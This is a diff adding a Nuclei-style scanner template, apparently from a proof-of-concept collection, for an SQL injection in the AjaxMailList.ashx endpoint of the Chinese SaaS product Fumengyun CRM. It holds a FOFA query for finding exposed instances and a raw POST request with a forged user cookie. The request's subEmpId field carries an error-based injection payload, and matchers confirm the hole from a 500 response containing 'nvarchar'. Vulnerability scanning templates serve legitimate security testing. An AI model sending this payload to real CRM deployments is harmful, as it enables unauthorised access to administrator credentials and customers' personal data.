@@ -1,0 +1,27 @@
+id: fumengyun-crm-ajaxmaillist-ashx-sql-injection
+info:
+  name: 孚盟云CRM AjaxMailList.ashx SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+    上海孚盟软件有限公司为外贸领域提供SaaS服务及行业解决方案。其旗下产品孚盟云的AjaxMailList.ashx接口存在SQL注入漏洞，攻击者可通过该漏洞绕过身份验证机制，直接访问数据库层面的数据资源，包括但不限于管理员后台凭证及用户个人信息。在具备高权限访问的情况下，攻击者可能进一步向服务器写入恶意代码，从而控制服务器系统权限。
+  tags: 孚盟云CRM
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxMailList.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=&subEmpId=1')and 1<user--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: body
+    words:
+    - nvarchar
